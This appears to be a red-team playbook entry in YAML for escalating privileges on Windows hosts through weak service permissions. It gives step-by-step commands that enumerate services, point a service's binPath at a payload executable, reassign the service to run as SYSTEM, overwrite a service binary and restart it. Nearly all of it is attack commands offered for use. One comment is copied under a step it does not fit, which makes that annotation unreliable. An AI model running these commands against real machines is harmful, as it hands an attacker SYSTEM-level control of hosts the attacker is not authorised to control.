title: Windows Services Weak Permissions Privilege Escalation
category: 
  - AD:
    - Privilege Escalation:
      - Host
tactic: Privilege Escalation
tags: []
description: 
references:

steps:
  - description: Enumerate installed services
    options: 
      - tool: SharpUp.exe 
        usage: SharpUp.exe audit UnquotedServicePath

      - tool: powershell
        usage: Get-Service | fl
      
      - tool: wmic
        usage: run wmic service get name, pathname
  
  - description: Check for unquoted service paths, related ACLs and modify the executable if possible
    options: 
      - tool: powershell
        usage: |
          Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl

          #Create your own service and put it to the path

        comments: Payloads to abuse services must be specific "service binaries", because they need to interact 
          with the Service Control Manager.
  
  - description: Check for weak service config permissions and modify the service if possible
    options: 
      - tool: SharpUp.exe 
        usage: SharpUp.exe audit ModifiableServices

      - tool: Powershell
        usage: |
          powershell-import C:\Tools\Get-ServiceAcl.ps1
          powershell Get-ServiceAcl -Name VulnService2 

          sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe

          #user also can be changed if necessary
          sc config VulnService2 obj="NT AUTHORITY\SYSTEM" password=""

        comment: The space after binPath= is intentional as this is how it's documented in sc's help documentation.

  - description: Check for weak service executable permissions and modify the executable if possible
    options: 
      - tool: SharpUp.exe 
        usage: SharpUp.exe audit ModifiableServices

      - tool: Powershell
        usage: |
          powershell-import C:\Tools\Get-ServiceAcl.ps1
          powershell Get-ServiceAcl -Name VulnService3

          run sc stop VulnService3
          copy "tcp-local_x64.svc.exe" "Service 3.exe"

        comment: The space after binPath= is intentional as this is how it's documented in sc's help documentation.
        
  - description: Run the vulnerable service
    options: 
      - tool: cmd
        usage: |
          run sc stop VulnService1
          run sc start VulnService1

comments:
  